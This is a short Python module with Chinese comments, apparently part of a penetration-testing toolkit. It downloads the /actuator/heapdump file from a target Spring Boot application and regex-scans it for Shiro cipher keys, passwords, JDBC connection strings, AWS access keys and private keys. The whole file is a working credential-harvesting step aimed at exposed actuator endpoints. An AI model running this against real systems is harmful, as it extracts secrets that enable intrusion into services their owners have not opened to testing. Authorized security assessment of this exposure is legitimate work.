"""F7 — heapdump 下载与密钥提取流程。

下载 /actuator/heapdump → 流式字符串扫描敏感凭据。
"""
from __future__ import annotations

import re
import tempfile
from pathlib import Path
from typing import Any

HEAPDUMP_PATTERNS: dict[str, bytes] = {
    "shiro_key": rb'cipherKey["\s:=]+([A-Za-z0-9+/=]{16,})',
    "password": rb'password["\s:=]+([^\s"]{6,50})',
    "jdbc": rb'jdbc:[a-zA-Z]+://[^\s"\']{1,200}',
    "secret": rb'secret["\s:=]+([A-Za-z0-9+/=._-]{16,})',
    "aws_key": rb'(AKIA[0-9A-Z]{16})',
    "private_key": rb'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
}


def download_and_analyze_heapdump(
    actuator_url: str,
    max_size_mb: int = 100,
    download_fn: Any | None = None,
) -> dict[str, Any]:
    """下载 heapdump 并字符串扫描敏感凭据。

    Args:
        actuator_url: actuator 根路径，如 http://target:8080/actuator
        max_size_mb: 最大下载体积，超过则跳过
        download_fn: 可选的下载回调，签名 (url) -> bytes | None

    Returns:
        {status: ok/skipped, size_mb, secrets: [...]}
    """
    heapdump_url = actuator_url.rstrip("/") + "/heapdump"

    if download_fn:
        content = download_fn(heapdump_url)
        if content is None:
            return {"status": "download_failed", "secrets": []}
        size_mb = len(content) / 1024 / 1024
        if size_mb > max_size_mb:
            return {"status": "skipped", "reason": f"size {size_mb:.1f}MB > {max_size_mb}MB"}
    else:
        content = b""
        size_mb = 0

    secrets = _scan_secrets(content)
    return {
        "status": "ok" if content else "empty",
        "size_mb": round(size_mb, 2),
        "secrets": secrets[:50],
        "url": heapdump_url,
    }


def _scan_secrets(content: bytes) -> list[dict[str, str]]:
    """对 heapdump 内容做字符串扫描。"""
    results: list[dict[str, str]] = []
    for name, pattern in HEAPDUMP_PATTERNS.items():
        for m in re.finditer(pattern, content):
            group = m.group(1) if m.lastindex else m.group(0)
            value = group.decode(errors="ignore")[:200] if isinstance(group, bytes) else str(group)[:200]
            results.append({"type": name, "value": value})
    return results


__all__ = ["download_and_analyze_heapdump", "HEAPDUMP_PATTERNS"]
